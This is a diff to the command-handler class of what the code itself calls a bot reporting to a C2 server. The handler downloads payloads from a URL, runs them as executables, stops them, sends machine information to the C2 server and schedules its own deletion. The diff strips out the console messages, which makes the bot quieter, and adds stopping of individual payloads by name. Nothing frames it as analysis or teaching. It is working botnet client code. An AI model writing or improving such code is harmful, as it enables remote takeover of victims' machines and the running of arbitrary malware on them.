@@ -35,34 +35,35 @@ class CommandHandler:
 
         # Ensure the payloads directory exists
         os.makedirs("payloads", exist_ok=True)
-        print(f"Downloading payload... from URL: {payloadURL}")
 
         r = requests.get(payloadURL)
         if r.status_code == 200:
             with open(outputFile, "wb") as f:
                 f.write(r.content)
-            print("File downloaded successfully")
         else:
             print("Failed to download file:", r.status_code)
 
 
     # Execute the payload on the bot's system, handle any errors that may occur during execution
     def __executePayload(self, id: str, params: list):
-        print("Executing Payload...")
+        isProgramSpecified = (id != None)
+        if (not isProgramSpecified):
+            return
+        
         payload_name = f"payloads/{id}.exe"
-        self.exeHandler.add_program(subprocess.Popen(payload_name, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP))
-        print("Payload executed successfully.")
+        self.exeHandler.add_program(subprocess.Popen(payload_name, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP), name=id)
 
 
     # Stop any running payloads
     def __stopPayload(self, id: str, params: list):
-        self.exeHandler.stop_all_programs()
-
+        stopAllPrograms = (id == None)
+        if (stopAllPrograms):
+            self.exeHandler.stop_all_programs()
+        else:
+            self.exeHandler.stop_program(name=id)
 
     # Announce bot status to C2 server
     def __announce_status(self, id: str, params: list):
-        print("Announcing status to C2 server...")
-
         mInfo = self.machineInfo.get_machine_info()
         ntfy = self.notificationBuilder.build_notification(mInfo, Command.STATUS)
 
@@ -109,7 +110,7 @@ class CommandHandler:
 
     # Take all necesarry steps so safely remove the bots program
     def __handle_remove(self, id, params):
-        self.__stopPayload(id, params)
+        self.exeHandler.stop_all_programs()
         self.__cleanupPayloads()
         self.__schedule_self_delete()
 
